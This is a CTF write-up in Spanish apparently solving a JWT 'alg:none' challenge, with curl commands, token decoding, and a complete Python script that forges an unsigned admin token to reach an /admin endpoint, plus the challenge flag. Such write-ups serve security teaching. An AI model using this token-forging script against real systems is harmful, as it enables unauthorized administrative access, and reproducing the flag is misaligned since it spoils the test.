# Solución Reto 8: JWT Algorithm Confusion — alg:none (ctf-jwt)

## Descripción
El reto consiste en un portal empresarial que usa JWT para autenticación. El servidor emite tokens con `alg: HS256` para el usuario `guest`, pero el código de verificación acepta cualquier algoritmo declarado en el header del token, incluyendo `none` (sin firma). Esto permite forjar un token con `role: admin` sin conocer el secreto del servidor.

Un JWT tiene tres partes separadas por puntos, cada una codificada en base64url:
```
header.payload.signature
```

Con `alg: none`, la firma puede estar vacía, por lo que el token queda como `header.payload.` (con el punto final pero sin firma).

## Pasos para la Explotación

### 1. Obtener un Token de Guest

Se hace login con las credenciales públicas usando el endpoint `POST /login`:

```bash
curl -s -X POST http://<HOST>:<PORT>/login \
  -H "Content-Type: application/json" \
  -d '{"username": "guest", "password": "guest"}'
```

Respuesta:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0.xxxx",
  "role": "guest"
}
```

### 2. Analizar el Token

Se decodifica el header y el payload (base64url → JSON):

```bash
# Header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

# Payload
echo "eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0=" | base64 -d
# → {"username":"guest","role":"guest"}
```

El campo `role` tiene el valor `guest`. Para acceder al panel admin hay que cambiarlo a `admin`.

### 3. Forjar el Token con alg:none

Se construye un nuevo token con el algoritmo `none` y `role: admin`:

```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"username": "guest", "role": "admin"}).encode())

token = f"{header}.{payload}."   # firma vacía, pero el punto es obligatorio
print(token)
```

### 4. Acceder al Panel de Administración

Se envía el token forjado al endpoint `/admin` mediante la cabecera `Authorization`:

```bash
curl -s http://<HOST>:<PORT>/admin \
  -H "Authorization: Bearer <TOKEN_FORJADO>"
```

Como el servidor acepta `alg: none` y no verifica la firma, el payload es decodificado directamente. Al encontrar `role: admin`, devuelve la flag:

```json
{
  "message": "Bienvenido al panel de administración.",
  "flag": "CTF{jwt_n0n3_4lg_byp4ss}"
}
```

### 5. Script Completo en Python

```python
import base64, json, urllib.request

TARGET = "http://<HOST>:<PORT>"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"username": "guest", "role": "admin"}).encode())
token   = f"{header}.{payload}."

req = urllib.request.Request(
    f"{TARGET}/admin",
    headers={"Authorization": f"Bearer {token}"}
)
with urllib.request.urlopen(req) as r:
    print(json.loads(r.read())["flag"])
```

## Flag
```
CTF{jwt_n0n3_4lg_byp4ss}
```
